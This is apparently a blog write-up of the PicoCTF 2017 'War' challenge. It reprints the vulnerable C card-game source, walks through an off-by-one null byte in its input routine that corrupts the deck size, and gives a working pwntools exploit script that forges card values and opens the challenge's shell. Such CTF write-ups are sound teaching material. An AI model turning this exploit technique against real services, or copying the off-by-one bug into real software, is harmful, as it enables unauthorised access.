---
layout: post
title: PicoCTF 2017 - War Writeup
tags: 
- ctf
- writeups
- picoctf
---

It's July 4th weekend and [WCTF 2018](https://ctftime.org/event/631) is running but no one on my team remembered to sign up prior to the signup deadline :cry: (sidenote: signup deadlines for CTFs should not be a thing!). In between reading [Practical Malware Analysis](https://nostarch.com/malware) and [The Hacker Playbook 3](https://www.amazon.com/Hacker-Playbook-Practical-Penetration-Testing-ebook/dp/B07CSPFYZ2), I'm craving some CTF practice. I decided it was time to go back to PicoCTF 2017 (which I never ended up finishing) and completing the challenges before PicoCTF 2018 goes live in September. "War" is the Master Challenge for Level 3 in PicoCTF 2017. It took me a lot longer to find the bug than I want to admit so I'm doing a writeup to compensate.

---

The challenge for War was given as:

```
Win a simple Card Game. Source. Connect on shell2017.picoctf.com:49182.
```

I was given an ELF [war](/static/picoctf2017_war/war), the corresponding source code **[war.c](/static/picoctf2017_war/war.c)**, and, of course, the server and port to connect to (`shell2017.picoctf.com:49182`).

**war.c**
---

```c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>

#define NAMEBUFFLEN 32
#define BETBUFFLEN 8

typedef struct _card{
    char suit;
    char value;
} card;

typedef struct _deck{
    size_t deckSize;
    size_t top;
    card cards[52];
} deck;

typedef struct _player{
    int money;
    deck playerCards;
} player;

typedef struct _gameState{
  int playerMoney;
  player ctfer;
  char name[NAMEBUFFLEN];
  size_t deckSize;
  player opponent;
} gameState;

gameState gameData;

//Shuffles the deck
//Make sure to call srand() before!
void shuffle(deck * inputDeck){
    card temp;
    size_t indexA, indexB;
    size_t deckSize = inputDeck->deckSize;
    for(unsigned int i=0; i < 1000; i++){
        indexA = rand() % deckSize;
        indexB = rand() % deckSize;
        temp = inputDeck->cards[indexA];
        inputDeck->cards[indexA] = inputDeck->cards[indexB];
        inputDeck->cards[indexB] = temp;
    }
}

//Checks if a card is in invalid range
int checkInvalidCard(card * inputCard){
    if(inputCard->suit > 4 || inputCard->value > 14){
        return 1;
    }
    return 0;
}

//Reads input from user, and properly terminates the string
unsigned int readInput(char * buff, unsigned int len){
    size_t count = 0;
    char c;
    while((c = getchar()) != '\n' && c != EOF){
        if(count < (len-1)){
            buff[count] = c;
            count++;
        }
    }
    buff[count+1] = '\x00';
    printf("Setting buff offset %lu to null\n", count+1);
    return count;
}

//Builds the deck for each player.
//Good luck trying to win ;)
void buildDecks(player * ctfer, player * opponent){
    for(size_t j = 0; j < 6; j++){
        for(size_t i = 0; i < 4; i++){
            ctfer->playerCards.cards[j*4 + i].suit = i;
            ctfer->playerCards.cards[j*4 + i].value = j+2;
        }
    }
    for(size_t j = 0; j < 6; j++){
        for(size_t i = 0; i < 4; i++){
            opponent->playerCards.cards[j*4 + i].suit = i;
            opponent->playerCards.cards[j*4 + i].value = j+9;
        }
    }
    ctfer->playerCards.cards[24].suit = 0;
    ctfer->playerCards.cards[24].value = 8;
    ctfer->playerCards.cards[25].suit = 1;
    ctfer->playerCards.cards[25].value = 8;
    opponent->playerCards.cards[24].suit = 2;
    opponent->playerCards.cards[24].value = 8;
    opponent->playerCards.cards[25].suit = 3;
    opponent->playerCards.cards[25].value = 8;

    ctfer->playerCards.deckSize = 26;
    ctfer->playerCards.top = 0;
    opponent->playerCards.deckSize = 26;
    opponent->playerCards.top = 0;
}

int main(int argc, char**argv){
    char betStr[BETBUFFLEN];
    card * oppCard;
    card * playCard;
    memset(&gameData, 0, sizeof(gameData));
    gameData.playerMoney = 100;
    int bet;

    buildDecks(&gameData.ctfer, &gameData.opponent);
    srand(time(NULL));//Not intended to be cryptographically strong

    shuffle(&gameData.ctfer.playerCards);
    shuffle(&gameData.opponent.playerCards);

    setbuf(stdout, NULL);

    //Set to be the smaller of the two decks.
    gameData.deckSize = gameData.ctfer.playerCards.deckSize > gameData.opponent.playerCards.deckSize
     ? gameData.opponent.playerCards.deckSize : gameData.ctfer.playerCards.deckSize;

    printf("Welcome to the WAR card game simulator. Work in progress...\n");
    printf("Cards don't exchange hands after each round, but you should be able to win without that,right?\n");
    printf("Please enter your name: \n");
    memset(gameData.name,0,NAMEBUFFLEN);
    if(!readInput(gameData.name,NAMEBUFFLEN)){
        printf("Read error. Exiting.\n");
        exit(-1);
    }
    printf("Welcome %s\n", gameData.name);
    while(1){
        size_t playerIndex = gameData.ctfer.playerCards.top;
        size_t oppIndex = gameData.opponent.playerCards.top;
        oppCard = &gameData.opponent.playerCards.cards[oppIndex];
        playCard = &gameData.ctfer.playerCards.cards[playerIndex];
        printf("You have %d coins.\n", gameData.playerMoney);
        printf("How much would you like to bet?\n");
        memset(betStr,0,BETBUFFLEN);
        if(!readInput(betStr,BETBUFFLEN)){
            printf("Read error. Exiting.\n");
            exit(-1);
        };
        bet = atoi(betStr);
        printf("you bet %d.\n",bet);
        if(!bet){
            printf("Invalid bet\n");
            continue;
        }
        if(bet < 0){
            printf("No negative betting for you! What do you think this is, a ctf problem?\n");
           continue;
        }
        if(bet > gameData.playerMoney){
            printf("You don't have that much.\n");
            continue;
        }
        printf("The opponent has a %d of suit %d.\n", oppCard->value, oppCard->suit);
        printf("You have a %d of suit %d.\n", playCard->value, playCard->suit);
        if((playCard->value * 4 + playCard->suit) > (oppCard->value * 4 + playCard->suit)){
            printf("You won? Hmmm something must be wrong...\n");
            if(checkInvalidCard(playCard)){
                printf("Cheater. That's not actually a valid card.\n");
            }else{
                printf("You actually won! Nice job\n");           
                gameData.playerMoney += bet;
            }
        }else{
            printf("You lost! :(\n");
            gameData.playerMoney -= bet;
        }
        gameData.ctfer.playerCards.top++;
        gameData.opponent.playerCards.top++;
        if(gameData.playerMoney <= 0){
            printf("You are out of coins. Game over.\n");
            exit(0);
        }else if(gameData.playerMoney > 500){
            printf("You won the game! That's real impressive, seeing as the deck was rigged...\n");
          system("/bin/sh -i");
            exit(0);
        }

        //TODO: Implement card switching hands. Cheap hack here for playability
        gameData.deckSize--;
        if(gameData.deckSize == 0){
            printf("All card used. Card switching will be implemented in v1.0, someday.\n");
            exit(0);
        }
        printf("\n");
      fflush(stdout);
    };

    return 0;
}

```

The program seems pretty straightforward. It asks for a username, then asks you to bet while drawing cards from each deck (just like the entirely deterministic card game War). For all binary exploitation problems, I like to start out by interacting with the service for a bit, just to get a feel for what is going on:

```
$ nc shell2017.picoctf.com 49182
Welcome to the WAR card game simulator. Work in progress...
Cards don't exchange hands after each round, but you should be able to win without that,right?
Please enter your name:
asdfasdf
Welcome asdfasdf
You have 100 coins.
How much would you like to bet?
10
you bet 10.
The opponent has a 12 of suit 2.
You have a 3 of suit 0.
You lost! :(

You have 90 coins.
How much would you like to bet?
1
you bet 1.
The opponent has a 12 of suit 1.
You have a 6 of suit 2.
You lost! :(

You have 89 coins.
How much would you like to bet?
1
you bet 1.
The opponent has a 10 of suit 0.
You have a 5 of suit 1.
You lost! :(

You have 88 coins.
How much would you like to bet?
88
you bet 88.
The opponent has a 9 of suit 0.
You have a 7 of suit 0.
You lost! :(
You are out of coins. Game over.
```

It seems that we are either very unlucky or the game is rigged. Looking at the code more closely, I immediately caught a couple things of interest:

  1. The `buildDecks()` function gives our player cards with value 8 and under while giving the opponent player cards with value 8 and higher! Unfair! Also, when giving our player cards with value 8, we get the two lower suits while the opponent gets the two higher suits. This means that we will always lose as every card in our deck is lower than every card in the opponent's deck.
  2. Our goal is very clearly to get to more than 500 points as we will be rewarded with `system("/bin/sh -i");`, where we can then `cat flag.txt` for the solution.

I spent a lot of time looking at the code and interacting with the remote service (without even touching the binary) in a half-asleep state before seeing that the line of code which compares the current player card against the opponent's card has a user error:

```c
if((playCard->value * 4 + playCard->suit) > (oppCard->value * 4 + playCard->suit)){
```

Somehow, the opponent's card value is being added to the _player's card suit_, instead of the _opponent's card suit_. Unfortunately, this led to a dead end since the comparison being used is _greater than_. Given all the cards in the player deck, we could only (at best) tie with the opponent card but that would still cause us to lose our bet.

Since our only possible interaction with the program is through our name input and our betting input, I made sure that all places where buffers were used had corresponding buffer lengths. Eventually, I came to the realization that the key to this problem lies in how input is read, via the `readInput()` function:

```c
//Reads input from user, and properly terminates the string
unsigned int readInput(char * buff, unsigned int len){
    size_t count = 0;
    char c;
    while((c = getchar()) != '\n' && c != EOF){
        if(count < (len-1)){
            buff[count] = c;
            count++;
        }
    }
    buff[count+1] = '\x00';
    printf("Setting buff offset %lu to null\n", count+1);
    return count;
}
```

The error with the above code is that the variable `count` can have value up to `len-1` (if the user input is right up to the length of the buffer). This means that when putting in a name with a max input of 32 characters (which is the amount of buffer space given for the name), `buff[32]` will get overwritten with a null byte `\x00`. This will cause some byte clobbering in whatever comes after the buffer that gets written to. Lucky for us, the way that the binary is compiled with less optimizations so we can figure out what will get clobbered:

```c
typedef struct _gameState{
  int playerMoney;
  player ctfer;
  char name[NAMEBUFFLEN];
  size_t deckSize;
  player opponent;
} gameState;
```

`deckSize` will get clobbered with a null byte `\x00` which works out perfectly for us since the deck size check will allow us to continue betting for more than 26 times:

```c
gameData.deckSize--;
if(gameData.deckSize == 0){
```

After the clobbering, `gameData.deckSize` will be 0 and then decremented so we won't enter our game end state. When we try this and continually bet 1 coin past the deck size of 26, we start to see that both decks are full of 0 values for a bit and then eventually becomes the values of our name buffer that we input earlier after we reach 48 coins:

```
You have 48 coins.
How much would you like to bet?
1
you bet 1.
The opponent has a 0 of suit 0.
You have a 65 of suit 65.
You won? Hmmm something must be wrong...
Cheater. That's not actually a valid card.

You have 48 coins.
How much would you like to bet?
1
you bet 1.
1The opponent has a 0 of suit 0.
You have a 65 of suit 65.
You won? Hmmm something must be wrong...
Cheater. That's not actually a valid card.

You have 48 coins.
How much would you like to bet?

you bet 1.
The opponent has a 0 of suit 0.
You have a 66 of suit 66.
You won? Hmmm something must be wrong...
Cheater. That's not actually a valid card.

You have 48 coins.
How much would you like to bet?
1
you bet 1.
The opponent has a 0 of suit 0.
You have a 66 of suit 66.
You won? Hmmm something must be wrong...
Cheater. That's not actually a valid card.
```

We have to remember that the input is little endian and the layout of the data in memory is _card suit_ then _card value_. From here, it's easy to write a script to solve the challenge with pwntools:

**[warsol.py](/static/picoctf2017_war/warsol.py)**
---

```python
from pwn import *
import sys

HOST = 'shell2017.picoctf.com'
PORT = 49182

def main(op):

  if op == 'p':
    r = process('./war')
  elif op == 'r':
    r = remote(HOST, PORT)
  else:
    print 'Must specify p for process or r for remote'
    sys.exit(0)
  r.recv(1024)
  r.sendline('\x04\x0e'*15 + 'A')

  for _ in range(52):
    print r.recv(1024)
    r.sendline('1')

  coins = 48
  while coins < 500:

    r.sendline(str(coins))
    r.recv(1024)
    coins *= 2

  r.interactive()

  r.close()

if __name__ == '__main__':
  if len(sys.argv) < 2:
    print 'Usage: python %s <p|r>' % (sys.argv[0])
    sys.exit(0)

  if sys.argv[1] != 'r' and sys.argv[1] != 'p':
    print 'Usage: python %s <p|r>' % (sys.argv[0])
    sys.exit(0)

  main(sys.argv[1])
```

Running the script gives us a shell:

```sh
$ python warsol.py r 

...

[*] Switching to interactive mode
you bet 192.
The opponent has a 0 of suit 0.
You have a 14 of suit 4.
You won? Hmmm something must be wrong...
You actually won! Nice job

You have 384 coins.
How much would you like to bet?
you bet 384.
The opponent has a 0 of suit 0.
You have a 14 of suit 4.
You won? Hmmm something must be wrong...
You actually won! Nice job
You won the game! That's real impressive, seeing as the deck was rigged...
/bin/sh: 0: can't access tty; job control turned off
$ whoami
war_3
$ ls 
flag.txt
war
war_no_aslr
xinetd_wrapper.sh
$ cat flag.txt
```
This took me more hours than it really should have but it was a fun challenge (as are all challenges from picoCTF). Looking forward to picoCTF 2018!